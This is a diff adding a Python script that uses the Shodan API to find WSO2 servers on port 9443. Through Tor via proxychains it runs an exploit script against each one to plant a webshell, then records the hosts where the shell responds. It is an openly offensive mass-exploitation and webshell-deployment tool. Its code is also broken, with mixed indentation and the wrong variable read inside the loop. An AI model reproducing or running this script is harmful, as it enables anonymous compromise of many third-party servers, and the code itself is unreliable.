@@ -1,0 +1,52 @@
+import shodan
+from shodan.cli.helpers import get_api_key
+import sys
+import os
+import subprocess
+import requests
+import re
+
+ 
+
+API_KEY = "YOUR API KEY" 
+workingDir = "YOUR WORKING DIR"
+
+webshellName = "YOUR WEBSHELL FILE"
+
+exploitFile = "exploit.py"
+http_proxy  = "socks5://127.0.0.1:9050"
+https_proxy = "socks5://127.0.0.1:9050"
+proxies = {
+    "http"  : http_proxy,
+    "https" : https_proxy
+}
+
+api = shodan.Shodan(API_KEY)
+
+result = api.search("http.html:WSO2 port:9443")
+
+# Loop through the matches and print each IP
+for service in result['matches']:
+    url = ""
+    try:
+		  if result['ssl']:
+        url = "https://" + result['ip_str'].rstrip() + ":" + str(result['port'])
+			
+		except:
+			  url = "http://" + result['ip_str'].rstrip() + ":" + str(result['port'])
+
+    try:
+        result = subprocess.Popen("proxychains python3 " + exploitFile +" "+ url + " " + webshellName, shell=True, stdout=subprocess.PIPE, cwd=workingDir)
+        stdout = result.stdout.read().decode('utf-8')
+        if re.search("authenticationendpoint",stdout):
+            exploitUrl = url + "//authenticationendpoint/" + webshellName
+            response = requests.get(exploitUrl, proxies=proxies, verify=False)
+            if re.search('cmd', response.text):
+                ipFile = open("ip.txt","a")
+                ipFile.write(exploitUrl + "\n")
+                print("success with url : " + exploitUrl)
+                ipFile.close()
+
+    except Exception as e:
+            print('Error: %s' % e)
+        
